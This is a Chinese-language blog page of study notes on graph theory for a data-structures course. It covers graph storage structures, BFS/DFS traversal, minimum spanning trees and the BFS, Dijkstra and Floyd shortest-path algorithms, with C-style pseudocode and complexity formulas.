<h3 id="连通图、强连通图"><a href="#连通图、强连通图" class="headerlink" title="连通图、强连通图"></a>连通图、强连通图</h3><p>无向图：若图G任意两个顶点都是连通的，则称图G为连通图，否则为非连通图<br>有向图：若图G任何一对顶点都是强连通的，则称此图为强连通图</p>
<script type="math/tex; mode=display">
常见考点：对于n个顶点的无向图G，若G是连通图，则最少有n-1条边。\\若G是非连通图，则最多可能有C_{n-1}^2条边\\对于有n个顶点的有向图G，若G是强连通图，则最少有n条边（形成回路）</script><h3 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223621217.png" alt="image-20220803223621217"></p>
<h3 id="连通分量"><a href="#连通分量" class="headerlink" title="连通分量"></a>连通分量</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223755599.png" alt="image-20220803223755599"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223815794.png" alt="image-20220803223815794"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803223952245.png" alt="image-20220803223952245"></p>
<h3 id="生成树、森林"><a href="#生成树、森林" class="headerlink" title="生成树、森林"></a>生成树、森林</h3><p>连通图的生成树是包含图中全部顶点的一个极小连通子图<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803224238846.png" alt="image-20220803224238846"><br>n个顶点应该有n-1条边<br>在非连通图中，连通分量的生成树构成了非连通图的生成森林<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803224538347.png" alt="image-20220803224538347"></p>
<h3 id="边的权、带权图-网"><a href="#边的权、带权图-网" class="headerlink" title="边的权、带权图/网"></a>边的权、带权图/网</h3><p>边的权：每条边都可以标上具用某种含义的数值，该数值称为该边的<strong>权值</strong>。<br>带权图/网：边上带有权值的图称为<strong>带权图</strong>，也称<strong>网</strong><br>带权路径长度：当图是带权图时，一条<strong>路径上所有边的权值之和</strong></p>
<h3 id="特殊形态的图"><a href="#特殊形态的图" class="headerlink" title="特殊形态的图"></a>特殊形态的图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803225437195.png" alt="image-20220803225437195"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803225522718.png" alt="image-20220803225522718"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803225858050.png" alt="image-20220803225858050"><br>树是连通图，有向树并不是强连通图</p>
<h2 id="邻接矩阵法"><a href="#邻接矩阵法" class="headerlink" title="邻接矩阵法"></a>邻接矩阵法</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806130207218.png" alt="image-20220806130207218"><br>有向图：出度为行中1的个数  入度为列中1的个数 。矩阵是行-&gt;列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100                      <span class="comment">//顶点数目最大值</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">    <span class="type">char</span> Vex[MaxVertexNum];                   <span class="comment">//顶点表</span></span><br><span class="line">    <span class="type">int</span> Edge[MaxVertexNum][MaxVertexNum];     <span class="comment">//邻接矩阵、边表  //因为数据为0，1，可以换为bool型</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;                        <span class="comment">//图当前的顶点数和边数/弧数</span></span><br><span class="line">&#125; MGraph</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806130727614.png" alt="image-20220806130727614"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806131031260.png" alt="image-20220806131031260"><br>使用宏定义常量表示无穷   #define INFINITY</p>
<h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><script type="math/tex; mode=display">
在n个顶点的图中，空间复杂度为O(n)+O(n^2)=O(|v|^2),|v|为顶点集的个数\\
所以空间复杂度与边数没有关系，更适合用于存储稠密图，因为无向图的邻接矩阵是对称矩阵，所以可以压缩为上三角矩阵进行存储</script><h3 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806131810061.png" alt="image-20220806131810061"></p>
<h2 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806134053572.png" alt="image-20220806134053572"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表存储的图（顺序存储） </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"><span class="comment">//顶点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">	VertexType data;               <span class="comment">//顶点信息</span></span><br><span class="line">    ArcNode *first;                <span class="comment">//第一条边</span></span><br><span class="line">&#125;VNode,AdjList[MaxVertexNum];</span><br><span class="line"><span class="comment">//边</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> adjvex;                    <span class="comment">//边指向的结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">next</span>;</span>           <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="comment">//InfoType info;                //边权值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无向图边结点数量是2|E|，整体空间复杂度为O(|V|+2|E|)<br>有向图边结点数量是|E|，整体空间复杂度为O(|V|+|E|)<br>邻接表存储稀疏图<br>出度：遍历目标结点的链表<br>入度：遍历整个链表寻找指向目标结点的个数</p>
<h2 id="十字链表、邻接多重表"><a href="#十字链表、邻接多重表" class="headerlink" title="十字链表、邻接多重表"></a>十字链表、邻接多重表</h2><p>十字链表用于存储有向图<br>邻接多重表存储无向图</p>
<h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806140152515.png" alt="image-20220806140152515"></h3><h3 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h3><p>邻接表存储无向图：每条边对于两份冗余数据，删除，删除顶点、边不方便<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806140736457.png" alt="image-20220806140736457"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806140750826.png" alt="image-20220806140750826"><br>空间复杂度：O(|V|+|E|)</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220806141213425.png" alt="image-20220806141213425"></p>
<h2 id="图的基本操作"><a href="#图的基本操作" class="headerlink" title="图的基本操作"></a>图的基本操作</h2><h3 id="Adjacent-G-x-y"><a href="#Adjacent-G-x-y" class="headerlink" title="Adjacent(G,x,y)"></a>Adjacent(G,x,y)</h3><p>判断图G是否存在边<x,y>(x,y)<br>该操作邻接矩阵更合适</x,y></p>
<h3 id="Neighbors-G-x"><a href="#Neighbors-G-x" class="headerlink" title="Neighbors(G,x)"></a>Neighbors(G,x)</h3><p>列出图G与结点x邻接的边<br>该操作一般情况下邻接矩阵更合适</p>
<h3 id="InsertVertex-G-x"><a href="#InsertVertex-G-x" class="headerlink" title="InsertVertex(G,x)"></a>InsertVertex(G,x)</h3><p>在图G中插入顶点x<br>在邻接矩阵和邻接表中都是在最后插入新的数据</p>
<h3 id="DeleteVertex-G-x"><a href="#DeleteVertex-G-x" class="headerlink" title="DeleteVertex(G,x)"></a>DeleteVertex(G,x)</h3><p>从图G中删除顶点x<br>邻接矩阵：删除一个顶点之后，将对应的行和列重置为0，可以设置一个bool变量表示是一个空结点</p>
<h3 id="AddEdge-G-x-y"><a href="#AddEdge-G-x-y" class="headerlink" title="AddEdge(G,x,y)"></a>AddEdge(G,x,y)</h3><p>若无向边（x,y)或者有向边<x,y>不存在，则向图G中添加该边<br>邻接表可以使用头插法，时间复杂度为O(1)</x,y></p>
<h3 id="FirstNeighbor-G-x"><a href="#FirstNeighbor-G-x" class="headerlink" title="FirstNeighbor(G,x)"></a>FirstNeighbor(G,x)</h3><p>求图G中顶点x的第一个邻接点，若有则返回顶点号，没有返回-1</p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><h3 id="广度优先遍历-BFS"><a href="#广度优先遍历-BFS" class="headerlink" title="广度优先遍历(BFS)"></a>广度优先遍历(BFS)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[max_vertex_num];            <span class="comment">//访问标记数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vernuml;++i)</span><br><span class="line">        visited[i]=<span class="literal">false</span>;                <span class="comment">//访问标记数组初始化</span></span><br><span class="line">    InitQueue(Q);                        <span class="comment">//初始化辅助队列Q</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)              <span class="comment">//从0号顶点开始遍历</span></span><br><span class="line">        <span class="keyword">if</span>(!visited[i])                  <span class="comment">//对每个连通分量调用BFS</span></span><br><span class="line">            BFS(G,i);                    <span class="comment">//vi未访问过，从vi开始BFS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;                 <span class="comment">//从顶点v出发，广度优先遍历图G</span></span><br><span class="line">    visit(v);                            <span class="comment">//访问初始节点</span></span><br><span class="line">    visited[v]=<span class="literal">true</span>;                     <span class="comment">//对顶点v做访问标记</span></span><br><span class="line">    Enqueue(Q,v);                        <span class="comment">//顶点v入队列Q</span></span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,v);                    <span class="comment">//顶点v出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">                visit(w);                <span class="comment">//w为v的尚未访问的邻接顶点</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;</span><br><span class="line">                EnQueue(Q,w);</span><br><span class="line">            &#125;<span class="comment">//if</span></span><br><span class="line">    &#125;<span class="comment">//while</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于无向图，调用BFS函数的次数=连通分量次数</p>
<script type="math/tex; mode=display">
邻接矩阵存储的图，时间复杂度是O(|V|^2)\\
邻接表的广度优先遍历时间复杂度是O(|V|+|E|)</script><p>广度优先生成树，邻接矩阵生成的树是唯一的，邻接表生成的树不一定是唯一的</p>
<h3 id="深度优先遍历-DFS"><a href="#深度优先遍历-DFS" class="headerlink" title="深度优先遍历(DFS)"></a>深度优先遍历(DFS)</h3><p>visited数组防止重复访问</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220817160208534.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM];   <span class="comment">//访问标记数组</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line">        visited[v]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[v])</span><br><span class="line">            DFS(G,v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">    visit(v);</span><br><span class="line">    visited[v]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighor(G,v,w))</span><br><span class="line">        <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">            DFS(G,w);</span><br><span class="line">        &#125;  <span class="comment">//if</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822104847638.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111010384.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111023324.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111113241.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111143570.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111202426.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111218447.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111235582.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822111255969.png" alt></p>
<p>空间复杂度：来自于递归调用，最坏是O(|V|)，最好是O(1)<br>时间复杂度：邻接矩阵——O(|V|^2)<br>                     邻接表——O(|V|+|E|)</p>
<p>注意处理非连通图（即使用一层for循环遍历图，通过visited数组判断是否已经遍历完成）</p>
<h3 id="广度优先和深度优先的对比"><a href="#广度优先和深度优先的对比" class="headerlink" title="广度优先和深度优先的对比"></a>广度优先和深度优先的对比</h3><p>广度优先使用的是队列，在BFS函数中通过while循环将一层一层入队元素<br>深度优先使用的是栈，在DFS函数中通过递归调用实现将一条路走到底</p>
<p>两种算法的复杂度是一样的，主要是看图的存储方式<br>注：邻接表不一样，得到的深度或者广度优先遍历序列不一样</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113501088.png" alt><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113548936.png" alt="image-20220822113548936"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113606400.png" alt><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822113614038.png" alt></p>
<h2 id="最小生成树-MST"><a href="#最小生成树-MST" class="headerlink" title="最小生成树(MST)"></a>最小生成树(MST)</h2><p>最小生成树可能有多个，但边的权值之和总是唯一且最小的<br>最小生成树的边数=顶点数-1<br>只有连通图才有生成树，非连通图只有生成森林</p>
<h3 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h3><p>从某一个顶点开始构建生成树；每次将代价最小的新顶点纳入生成树，直到所有的顶点都纳入为止</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822144757688.png" alt><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822144926520.png" style="zoom:80%;"></p>
<h3 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h3><p>每次挑选一条权值最小的便，使这条边两头连通(原本已经连通的就不选)，直到所有结点都联通<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145315769.png" style="zoom:80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145256226.png" style="zoom: 80%;"></p>
<h3 id="Prim算法与Kruskal算法"><a href="#Prim算法与Kruskal算法" class="headerlink" title="Prim算法与Kruskal算法"></a>Prim算法与Kruskal算法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145611660.png" alt></p>
<h3 id="Prim算法的实现思想"><a href="#Prim算法的实现思想" class="headerlink" title="Prim算法的实现思想"></a>Prim算法的实现思想</h3><p>初始化<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822145817443.png" alt><br>循环遍历所有结点，找到lowcast最低的，且还没加入树的顶点。再次循环遍历，更新还没加入的各个顶点的lowcast值<br>从V0开始，总共需要n-1轮循环，每一轮的时间复杂度O(2n)，所以总时间复杂度为(n-1)O(2n)=O(n^2)，即O(|V|^2)</p>
<h3 id="Kruskal算法的实现思想"><a href="#Kruskal算法的实现思想" class="headerlink" title="Kruskal算法的实现思想"></a>Kruskal算法的实现思想</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822150435335.png" alt><br>检查第一条边的两个顶点是都连通（是否属于同一个集合)————实现方法：并查集<br>检查第二条边的两个顶点是都连通（是否属于同一个集合)<br>检查第三条边的两个顶点是都连通（是否属于同一个集合)<br>·······<br>检查最后一条边的两个顶点是都连通（是否属于同一个集合)</p>
<script type="math/tex; mode=display">
共执行e轮，每轮判断两个顶点是否属于同一集合，需要O(log_2e)，所以总时间复杂度为O(elog_2e)</script><p>——————《算法导论》</p>
<h2 id="最短路径问题——BFS算法"><a href="#最短路径问题——BFS算法" class="headerlink" title="最短路径问题——BFS算法"></a>最短路径问题——BFS算法</h2><h3 id="BFS求无权图的单源最短路径"><a href="#BFS求无权图的单源最短路径" class="headerlink" title="BFS求无权图的单源最短路径"></a>BFS求无权图的单源最短路径</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFS_Distance</span><span class="params">(Graph G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i) &#123;</span><br><span class="line">        d[i]=∞;  <span class="comment">//d[i]表示从u到i的最短路径，初始化路径长度</span></span><br><span class="line">        path[i]=<span class="number">-1</span>;  <span class="comment">//最短路径从哪个顶点过来</span></span><br><span class="line">    &#125;</span><br><span class="line">    d[u]=<span class="number">0</span>;</span><br><span class="line">    visited[u]=<span class="literal">true</span>;</span><br><span class="line">    EnQueue(Q,u);</span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q)) &#123;		<span class="comment">//BFS算法主过程</span></span><br><span class="line">        DeQueue(Q,u);            <span class="comment">//队头元素出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FristNeighbor(G,u);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,u,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w]) &#123;         <span class="comment">//w为u尚未访问的邻接结点</span></span><br><span class="line">                d[w]=d[u]+<span class="number">1</span>;       <span class="comment">//路径长度+1</span></span><br><span class="line">                path[w]=u;         <span class="comment">//最短路径从u到w</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;   <span class="comment">//设置已访问标记</span></span><br><span class="line">                EnQueue(Q,w);      <span class="comment">//顶点w入队</span></span><br><span class="line">            &#125; <span class="comment">//if</span></span><br><span class="line">    &#125; <span class="comment">//while</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822152400138.png" alt></p>
<p>算法过程：</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153144597.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153238514.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153332062.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153402310.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153436902.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153514478.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822153522102.png" alt></p>
<h2 id="最短路径算法——Dijkstra算法"><a href="#最短路径算法——Dijkstra算法" class="headerlink" title="最短路径算法——Dijkstra算法"></a>最短路径算法——Dijkstra算法</h2><p>BFS算法求单源最短路径只适用于无权图，或所有边的权值都相同的图</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155010006.png" alt></p>
<p>循环遍历所有节点，找到还没确定最短路径且dist最小的顶点Vi，另final[i]=true,检查所有邻接自Vi的顶点，若其final值为false，则更新dist和path</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155437661.png" style="zoom:80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155614936.png" style="zoom:80%;"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822160001351.png" style="zoom:80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822160016525.png" style="zoom:80%;"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822155802078.png" alt></p>
<script type="math/tex; mode=display">
伪代码实现：\\
初始：若从V_0开始，令final[0]=true;dist[0]=0;path[0]=-1。\\
其余顶点final[k]=false;dist[k]=arcs[0][k];path[k]=(arcs[0][k]==∞)?-1:0\\
n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且dist最小的顶点V_i，令final[i]=true。\\
并检查所有邻接自V_i的顶点，对于邻接自V_i的顶点V_j,若final[j]==false且dist[i]+arcs[i][j]<dist[j]\\
则令dist[j]=dist[i]+arcs[i][j];path[j]=i.(注：arcs[i][j]表示V_i到V_j的弧的权值)\\
时间复杂度：O(n^2)即O(|V|^2)</script><p>注意：Dijkstra算法不适用于有负权值的带权图</p>
<h2 id="最短路径问题——Floyd算法"><a href="#最短路径问题——Floyd算法" class="headerlink" title="最短路径问题——Floyd算法"></a>最短路径问题——Floyd算法</h2><p>使用动态规划思想，将问题的求解分为多个阶段</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822162139905-16611676211511.png" alt></p>
<script type="math/tex; mode=display">
若允许在V_k进行中转\\
若A^{(k-1)}[i][j]>A^{k-1}[i][k]+A^{(k-1)}[k][j]\\
则A^{(k)}[i][j]=A^{(k-1)}[i][k]+A^{(k-1)}[k][j]\\
path^{(k)}[i][j]=k\\
否则A^{(k)}和path^{(k)}保持原值</script><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163032743-16611676211512.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163208295-16611676211513.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163313451-16611676211514.png" alt></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822163320676-16611676211515.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//准备工作，初始化矩阵A(即邻接矩阵)和矩阵path</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++) &#123;    <span class="comment">//考虑以Vk作为中转点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;    <span class="comment">//遍历整个矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j])&#123;     <span class="comment">//以Vk作为中转点的路径更短</span></span><br><span class="line">                A[i][j]=A[i][k]+A[k][j];     <span class="comment">//更新最短路径长度</span></span><br><span class="line">                path[i][j]=k;                <span class="comment">//中转点</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度：O(|V|^3)\\
空间复杂度：O(|V|^2)</script><h4 id="Floyd算法实例"><a href="#Floyd算法实例" class="headerlink" title="Floyd算法实例"></a>Floyd算法实例</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164622091-16611676211516.png" alt><br>初始状态<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164556099.png" alt><br>允许V0中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164535721.png" alt><br>允许V1中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822164803197.png" alt><br>允许V2中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165126097.png" alt></p>
<script type="math/tex; mode=display">
注意其中A[0][3]通过A[2]中转时:\\
A[0][3]=A[0][2]+A[2][3]已经考虑到了V_0->V_2->V_1->V_3的路程</script><p>允许V3中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165455969-166116762115211.png" alt><br>允许V4中转<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165812367.png" alt></p>
